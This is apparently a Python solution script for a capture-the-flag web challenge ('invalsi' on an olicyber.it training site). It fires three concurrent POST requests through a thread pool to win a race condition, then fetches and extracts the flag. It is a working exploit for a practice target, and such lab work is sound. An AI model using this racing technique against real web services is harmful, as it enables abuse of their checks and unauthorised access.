import requests, re
from multiprocessing.dummy import Pool

REGEX = r"flag{.*?}"

pool = Pool(3)
site = "http://invalsi.challs.olicyber.it/"
s = requests.Session()
s.get(site)
da = ["0","1","2","3","4","5","6","7","8","9"]

futures = []
for x in range(3):
    futures.append(pool.apply_async(s.post, [site], {"json":da}))
for future in futures:
    future.get()
r = s.get(site + "flag").text
print(re.findall(REGEX, r)[0])